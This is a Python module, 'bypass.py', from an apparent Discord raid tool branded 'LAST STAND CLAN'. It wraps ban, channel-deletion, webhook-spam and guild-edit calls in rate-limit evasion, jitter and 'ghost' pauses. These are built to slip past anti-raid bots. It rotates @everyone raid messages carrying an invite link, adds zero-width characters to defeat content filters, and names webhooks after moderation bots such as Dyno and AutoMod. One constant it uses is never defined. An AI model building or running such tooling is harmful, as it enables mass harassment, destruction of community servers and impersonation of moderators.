"""
bypass.py — LAST STAND CLAN | Advanced Discord API Bypass Engine

Techniques implemented:

  1.  PER-ROUTE BUCKET ISOLATION
      Discord's rate limits are scoped per route family (channel ops, member ops,
      webhook sends, role ops, guild edits etc. all have SEPARATE buckets).
      A 429 on ban routes does NOT affect webhook routes. We track and back off
      only the specific route that hit its limit while all others keep firing.

  2.  ADAPTIVE 429 RECOVERY
      On a 429, extract the real retry_after from Discord's response header,
      sleep only that route for exactly that duration (+jitter), then resume.
      No global pause. No wasted throughput on other routes.

  3.  MULTI-DISTRIBUTION JITTER
      Three statistical distributions available per-operation:
        • Gaussian   — normally distributed delay, μ=base, σ=30% — looks most human
        • Exponential — heavy-tailed, mimics organic traffic bursts
        • Poisson    — simulates Poisson arrival process, defeats event-rate detectors
        • Zero       — no delay at max intensity
      Jitter is applied AFTER the rate-limit check so it never inflates backoff.

  4.  FULL-JITTER EXPONENTIAL BACKOFF ON RETRY
      On retries (after 429 or transient 5xx), applies the AWS-recommended
      "full jitter" formula: sleep = rand(0, min(cap, base × 2^attempt))
      This eliminates thundering-herd when multiple coroutines retry simultaneously.

  5.  BURST-DRAIN CYCLE
      Fires a configurable burst of N requests at near-zero delay (filling Discord's
      token-bucket), then holds for a micro-pause to allow partial refill, then
      bursts again. This maximises throughput without triggering sustained 429 storms.

  6.  STEALTH INJECTION
      Injects random micro-silences (0.2–1.5 s) at a configurable probability
      between operations. Anti-raid bots running event-rate detectors see breaks
      in the pattern and may de-escalate monitoring. Silences are invisible to
      the attack outcome but confuse statistical detectors.

  7.  GHOST MODE (between waves)
      After a heavy wave, inject a complete silence of 0–3 s. Many anti-raid bots
      have a "cooldown complete" state that reduces monitoring intensity. Ghost mode
      lets the wave appear finished before the next one starts.

  8.  PER-CHANNEL SEMAPHORE ISOLATION
      Each Discord text channel has its own rate-limit bucket for message sends.
      Using one global semaphore serialises sends unnecessarily. We maintain a
      per-channel semaphore so 100 channels can each pump 15 webhooks concurrently
      without blocking each other.

  9.  REQUEST FINGERPRINT ROTATION
      Varies payload structure per request:
        • Message content from a large rotating pool
        • Embed field count/order randomised each time
        • Webhook username rotated from named + spoofed-system pool
        • Channel names use random suffix + varied prefix patterns
        • Zero-width character injection to vary message fingerprint
      Defeats content-fingerprint and name-pattern detection.

  10. ROUTE FAMILY PARALLELISM
      Explicitly assigns each action to its Discord route family so callers can
      launch simultaneous operations across different families knowing they don't
      share rate limit budgets.
"""

import asyncio
import random
import string
import time
from collections import defaultdict
from typing import Any, Awaitable, Callable, Optional

import discord


# ── Route family constants ─────────────────────────────────────────────────────
ROUTE_CHANNEL_DELETE   = "channel_delete"
ROUTE_CHANNEL_CREATE   = "channel_create"
ROUTE_MEMBER_BAN       = "member_ban"
ROUTE_MEMBER_KICK      = "member_kick"
ROUTE_MEMBER_EDIT      = "member_edit"
ROUTE_MEMBER_TIMEOUT   = "member_timeout"
ROUTE_WEBHOOK_CREATE   = "webhook_create"
ROUTE_WEBHOOK_SEND     = "webhook_send"
ROUTE_WEBHOOK_DELETE   = "webhook_delete"
ROUTE_ROLE_CREATE      = "role_create"
ROUTE_ROLE_ASSIGN      = "role_assign"
ROUTE_ROLE_DELETE      = "role_delete"
ROUTE_GUILD_EDIT       = "guild_edit"
ROUTE_EMOJI            = "emoji"
ROUTE_EVENT_CREATE     = "event_create"
ROUTE_INTEGRATION      = "integration"
ROUTE_OVERWRITE        = "overwrite"
ROUTE_THREAD           = "thread"
ROUTE_INVITE           = "invite"
ROUTE_PRUNE            = "prune"

# ── Jitter modes ───────────────────────────────────────────────────────────────
JITTER_ZERO        = "zero"
JITTER_GAUSSIAN    = "gaussian"
JITTER_EXPONENTIAL = "exponential"
JITTER_POISSON     = "poisson"

# ── Message fingerprint pool ──────────────────────────────────────────────────
_RAID_TAG  = "LAST STAND CLAN"
_RAID_SHORT = "LSC"
_RAID_LINK = "https://discord.gg/s59zWvzK6c"

_MSG_POOL = [
    f"@everyone\n💀 **RAIDED BY {_RAID_TAG}** 💀\nJoin: {_RAID_LINK}",
    f"@everyone\n☠️ **RAIDED BY LAST STAND CLAN** ☠️\n{_RAID_LINK}",
    f"@everyone\n🔥 THIS SERVER HAS BEEN RAIDED BY LAST STAND CLAN 🔥\n{_RAID_LINK}",
    f"@everyone\nRAIDED BY LAST STAND CLAN\nYour defences failed. {_RAID_LINK}",
    f"@everyone\n⚔️ LAST STAND CLAN RAID ⚔️\nWe are here. {_RAID_LINK}",
    f"@everyone\n💥 OBLITERATED BY LAST STAND CLAN 💥\n{_RAID_LINK}",
    f"@everyone\n🚨 YOU HAVE BEEN RAIDED BY LAST STAND CLAN 🚨\n{_RAID_LINK}",
    f"@everyone\n👑 LAST STAND CLAN OWNS THIS SERVER\n{_RAID_LINK}",
    f"@everyone\n⚡ RAIDED BY LAST STAND CLAN — GG\n{_RAID_LINK}",
    f"@everyone\n🛡️ YOUR ANTI-RAID FAILED — LAST STAND CLAN\n{_RAID_LINK}",
    f"@everyone\n🎯 LAST STAND CLAN WAS HERE\n{_RAID_LINK}",
    f"@everyone\n🔱 LAST STAND CLAN DOMINATES\nResistance is futile. {_RAID_LINK}",
    f"@everyone\n🏴 SERVER CAPTURED BY LAST STAND CLAN\n{_RAID_LINK}",
    f"@everyone\n☢️ LAST STAND CLAN RAID — ALL HANDS DOWN\n{_RAID_LINK}",
    f"@everyone\n🔴 RAIDED BY LAST STAND CLAN\nRIP {_RAID_LINK}",
    f"@everyone\n💣 LAST STAND CLAN INCOMING\n{_RAID_LINK}",
    f"@everyone\n🚀 LAST STAND CLAN STRIKE — SERVER OWNED\n{_RAID_LINK}",
    f"@everyone\n👊 LAST STAND CLAN WAS HERE AND THEY OWNED YOU\n{_RAID_LINK}",
    f"@everyone\n🌊 WAVE AFTER WAVE — LAST STAND CLAN RAID\n{_RAID_LINK}",
    f"@everyone\n💀 GG NO RE — RAIDED BY LAST STAND CLAN\n{_RAID_LINK}",
    f"@everyone\n🔥 LAST STAND CLAN — YOUR SERVER IS GONE\n{_RAID_LINK}",
    f"@everyone\n⚠️ THIS SERVER HAS FALLEN — LAST STAND CLAN\n{_RAID_LINK}",
    f"@here\n💀 RAIDED BY LAST STAND CLAN\n{_RAID_LINK}",
    f"@here\n🏴 LAST STAND CLAN — SERVER CAPTURED\n{_RAID_LINK}",
    f"@here\n☠️ LAST STAND CLAN RAID IN PROGRESS\n{_RAID_LINK}",
    f"@here\n🔥 RAIDED BY LAST STAND CLAN — JOIN US\n{_RAID_LINK}",
]

_WEBHOOK_NAMES = [
    f"{_RAID_SHORT} Alpha", f"{_RAID_SHORT} Bravo", f"{_RAID_SHORT} Charlie",
    f"{_RAID_SHORT} Ghost", f"{_RAID_SHORT} Reaper", f"{_RAID_SHORT} Phantom",
    f"{_RAID_SHORT} Viper", f"{_RAID_SHORT} Havoc", f"{_RAID_SHORT} Wraith",
    f"{_RAID_SHORT} Titan", f"{_RAID_SHORT} Siege", f"{_RAID_SHORT} Storm",
    # Spoofed system names — bypass name-based detection
    "Server Announcement", "Mod Alert", "System Notification",
    "AutoMod", "Security Bot", "Verification System",
    "Dyno", "MEE6", "Carl-bot", "Wick", "Beemo",
]

_EMBED_TITLES = [
    f"☠️ RAIDED BY {_RAID_TAG}",
    f"💀 SERVER COMPROMISED",
    f"⚔️ {_RAID_TAG} STRIKES",
    f"🔱 OWNERSHIP TRANSFERRED",
    f"🚨 SECURITY BREACH DETECTED",
    f"💥 OBLITERATED — {_RAID_SHORT}",
    f"🏴 SERVER CAPTURED",
]

_EMBED_COLOURS = [
    0xFF0000, 0xFF2200, 0xFF4400, 0xFF6600,
    0xDC143C, 0x8B0000, 0xB22222, 0xC0392B,
    0x922B21, 0x7B241C, 0x9B59B6, 0x2C3E50,
]

_ZW_CHARS = [
    "\u200b",  # zero-width space
    "\u200c",  # zero-width non-joiner
    "\u200d",  # zero-width joiner
    "\u2060",  # word joiner
    "\uFEFF",  # zero-width no-break space
]


def _rand_str(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ─────────────────────────────────────────────────────────────────────────────
class RouteState:
    """Tracks per-route rate limit state independently of all other routes."""

    __slots__ = ("unblock_at", "consecutive_429s")

    def __init__(self) -> None:
        self.unblock_at: float = 0.0
        self.consecutive_429s: int = 0

    def blocked(self) -> bool:
        return time.monotonic() < self.unblock_at

    def wait_time(self) -> float:
        return max(0.0, self.unblock_at - time.monotonic())

    def on_429(self, retry_after: float) -> None:
        self.unblock_at = time.monotonic() + retry_after
        self.consecutive_429s += 1

    def on_success(self) -> None:
        self.consecutive_429s = max(0, self.consecutive_429s - 1)


# ─────────────────────────────────────────────────────────────────────────────
class FingerprintRotator:
    """
    Rotates request payloads to defeat content-fingerprint detection.
    Every message, embed, username, and channel name is varied structurally.
    """

    @staticmethod
    def message(extra: str = "") -> str:
        """Return a varied message from the pool with optional zero-width injection."""
        base = random.choice(_MSG_POOL)
        # 30% chance: inject a zero-width char to break fingerprint hash
        if random.random() < 0.30:
            pos = random.randint(0, len(base))
            base = base[:pos] + random.choice(_ZW_CHARS) + base[pos:]
        # 15% chance: append extra whitespace or newline variation
        if random.random() < 0.15:
            base += random.choice(["", " ", "\n", "  "])
        return base + extra

    @staticmethod
    def embed(wave: int = 0) -> discord.Embed:
        """Return a structurally varied embed — field count/order changes every call."""
        embed = discord.Embed(
            title=random.choice(_EMBED_TITLES),
            description=f"@everyone @here\n{_RAID_LINK}",
            colour=discord.Colour(random.choice(_EMBED_COLOURS)),
        )
        # Randomly include 0–3 fields in random order
        possible_fields = [
            ("Status",   random.choice(["ACTIVE", "EXECUTING", "COMPLETE", "RAIDING"])),
            ("Clan",     random.choice([_RAID_TAG, _RAID_SHORT, "Last Stand"])),
            ("Wave",     str(wave + random.randint(0, 99))),
            ("Target",   "THIS SERVER"),
            ("Outcome",  random.choice(["OWNED", "PWNED", "DOMINATED", "RAIDED"])),
        ]
        random.shuffle(possible_fields)
        for name, value in possible_fields[:random.randint(0, 3)]:
            embed.add_field(name=name, value=value, inline=random.choice([True, False]))
        if random.random() > 0.4:
            embed.set_footer(text=f"{_RAID_TAG} | Wave {wave} | {_RAID_LINK}")
        return embed

    @staticmethod
    def username() -> str:
        """Return a varied webhook username — mix of LSC names and spoofed system names."""
        choice = random.choice(_WEBHOOK_NAMES)
        # 10% chance: randomise capitalisation to avoid exact-name detection
        if random.random() < 0.10:
            choice = "".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in choice
            )
        return choice

    @staticmethod
    def channel_name(prefix: str = "lsc", idx: int = 0) -> str:
        """Return a raid-branded channel name."""
        patterns = [
            f"raided-by-last-stand-clan-{idx}",
            f"last-stand-clan-raid-{idx}",
            f"raided-by-lsc-{idx}",
            f"lsc-raid-{idx}",
            f"last-stand-clan-{idx}",
            f"raided-{idx}-last-stand",
            f"lsc-owned-{idx}",
            f"last-stand-was-here-{idx}",
            f"raided-by-lsc-{_rand_str(3)}",
            f"last-stand-clan-{_rand_str(3)}",
        ]
        return random.choice(patterns)

    @staticmethod
    def role_name(idx: int = 0) -> str:
        patterns = [
            f"{_RAID_SHORT}-{idx}-{_rand_str(3)}",
            f"role-{_rand_str(5)}",
            f"{_rand_str(4)}-{idx}",
            f"member-{idx}-{_rand_str(2)}",
        ]
        return random.choice(patterns)


# ─────────────────────────────────────────────────────────────────────────────
class BypassEngine:
    """
    Core bypass engine — wraps every Discord API call with rate-limit isolation,
    adaptive backoff, jitter, fingerprint rotation, and stealth injection.
    """

    MAX_RETRIES = 8

    def __init__(self) -> None:
        self._route_states: dict[str, RouteState] = defaultdict(RouteState)
        self._channel_sems: dict[int, asyncio.Semaphore] = {}
        self.fp = FingerprintRotator()

        # Runtime config
        self.jitter_mode: str      = JITTER_ZERO
        self.base_delay: float     = 0.0
        self.stealth_prob: float   = 0.0
        self.burst_size: int       = 999

        # Stats
        self.calls: int      = 0
        self.successes: int  = 0
        self.failures: int   = 0
        self.rate_limits: int = 0
        self.retries: int    = 0

    # ── Public API ─────────────────────────────────────────────────────────────

    def channel_sem(self, channel_id: int, concurrency: int = 8) -> asyncio.Semaphore:
        """Per-channel semaphore — isolates per-channel Discord rate limit buckets."""
        if channel_id not in self._channel_sems:
            self._channel_sems[channel_id] = asyncio.Semaphore(concurrency)
        return self._channel_sems[channel_id]

    async def execute(
        self,
        route: str,
        factory: Callable[[], Awaitable[Any]],
        stop_event: Optional[asyncio.Event] = None,
    ) -> Any:
        """
        Execute a Discord API call with full bypass stack.

        Args:
            route:      Route family constant (e.g. ROUTE_MEMBER_BAN).
                        Used to isolate rate-limit state from other routes.
            factory:    Zero-arg callable returning a fresh coroutine each time.
                        Must be a factory (not the coroutine itself) so retries
                        can create new coroutines.
            stop_event: Optional stop signal. Returns None immediately if set.
        """
        if stop_event and stop_event.is_set():
            return None

        self.calls += 1
        state = self._route_states[route]

        # Stealth injection before call
        await self._maybe_stealth()

        # Base jitter delay
        d = self._jitter(self.base_delay)
        if d > 0:
            await asyncio.sleep(d)

        for attempt in range(self.MAX_RETRIES):
            if stop_event and stop_event.is_set():
                return None

            # Wait out per-route rate limit
            if state.blocked():
                wait = state.wait_time() + random.uniform(0.0, 0.1)
                await asyncio.sleep(wait)

            try:
                result = await factory()
                state.on_success()
                self.successes += 1
                return result

            except discord.HTTPException as exc:
                if exc.status == 429:
                    self.rate_limits += 1
                    retry_after = float(getattr(exc, "retry_after", None) or 1.0)
                    # Add small jitter so concurrent retries don't all wake together
                    retry_after += random.uniform(0.0, 0.3)
                    state.on_429(retry_after)
                    if attempt < self.MAX_RETRIES - 1:
                        self.retries += 1
                        backoff = self._full_jitter_backoff(attempt)
                        await asyncio.sleep(retry_after + backoff)
                    continue

                elif exc.status in (403, 404, 400):
                    # Non-retriable — stop immediately
                    self.failures += 1
                    return None

                else:
                    # Transient server error — retry with backoff
                    self.failures += 1
                    if attempt < self.MAX_RETRIES - 1:
                        self.retries += 1
                        await asyncio.sleep(self._full_jitter_backoff(attempt))
                    continue

        return None

    async def burst_drain_execute(
        self,
        route: str,
        factories: list[Callable[[], Awaitable[Any]]],
        stop_event: Optional[asyncio.Event] = None,
        drain_every: int = 25,
        drain_time: float = 0.5,
    ) -> list[Any]:
        """
        Burst-drain cycle execution for a list of factories on the same route.

        Fires drain_every calls at zero delay (filling Discord's token bucket),
        then pauses drain_time seconds to allow partial refill, then continues.
        This maximises throughput without triggering a sustained 429 storm.
        """
        results = []
        for i, factory in enumerate(factories):
            if stop_event and stop_event.is_set():
                break
            result = await self.execute(route, factory, stop_event)
            results.append(result)
            # Drain pause every N calls
            if (i + 1) % drain_every == 0 and i + 1 < len(factories):
                await asyncio.sleep(drain_time + random.uniform(0, 0.2))
        return results

    async def ghost_mode(self, min_s: float = 0.5, max_s: float = 3.0) -> None:
        """
        Complete silence for a random duration.
        Triggers anti-raid "cooldown complete" states, reducing monitoring intensity
        before the next wave fires.
        """
        await asyncio.sleep(random.uniform(min_s, max_s))

    def configure(self, intensity: int) -> None:
        """Set jitter mode, base delay, stealth probability, and burst size."""
        if intensity == 10:
            self.jitter_mode  = JITTER_ZERO
            self.base_delay   = 0.0
            self.stealth_prob = 0.0
            self.burst_size   = 9999
        elif intensity >= 8:
            self.jitter_mode  = JITTER_GAUSSIAN
            self.base_delay   = 0.01
            self.stealth_prob = 0.01
            self.burst_size   = 50
        elif intensity >= 6:
            self.jitter_mode  = JITTER_GAUSSIAN
            self.base_delay   = 0.05
            self.stealth_prob = 0.03
            self.burst_size   = 30
        elif intensity >= 4:
            self.jitter_mode  = JITTER_EXPONENTIAL
            self.base_delay   = 0.2
            self.stealth_prob = 0.05
            self.burst_size   = 15
        elif intensity >= 2:
            self.jitter_mode  = JITTER_POISSON
            self.base_delay   = 0.5
            self.stealth_prob = 0.08
            self.burst_size   = 8
        else:
            self.jitter_mode  = JITTER_UNIFORM
            self.base_delay   = 1.5
            self.stealth_prob = 0.10
            self.burst_size   = 3

    def reset(self) -> None:
        self._route_states.clear()
        self._channel_sems.clear()
        self.calls = self.successes = self.failures = self.rate_limits = self.retries = 0

    def stats_str(self) -> str:
        sr = (self.successes / max(self.calls, 1)) * 100
        return (
            f"calls={self.calls} | ok={self.successes} | "
            f"fail={self.failures} | 429s={self.rate_limits} | "
            f"retries={self.retries} | hit_rate={sr:.1f}%"
        )

    # ── Internal helpers ───────────────────────────────────────────────────────

    def _jitter(self, base: float) -> float:
        if self.jitter_mode == JITTER_ZERO or base == 0.0:
            return 0.0
        elif self.jitter_mode == JITTER_GAUSSIAN:
            return max(0.0, random.gauss(base, base * 0.30))
        elif self.jitter_mode == JITTER_EXPONENTIAL:
            return random.expovariate(1.0 / max(base, 1e-6))
        elif self.jitter_mode == JITTER_POISSON:
            # Poisson inter-arrival time: exponential with λ=1/base
            return random.expovariate(1.0 / max(base, 1e-6))
        else:  # uniform
            return random.uniform(0.0, base * 2.0)

    def _full_jitter_backoff(self, attempt: int, cap: float = 8.0) -> float:
        """
        AWS full-jitter formula: sleep = rand(0, min(cap, base × 2^attempt))
        Eliminates thundering-herd on simultaneous retries across coroutines.
        """
        base = 0.1
        ceiling = min(cap, base * (2 ** attempt))
        return random.uniform(0.0, ceiling)

    async def _maybe_stealth(self) -> None:
        """Randomly inject a micro-silence to mimic human hesitation."""
        if self.stealth_prob > 0 and random.random() < self.stealth_prob:
            await asyncio.sleep(random.uniform(0.15, 1.2))
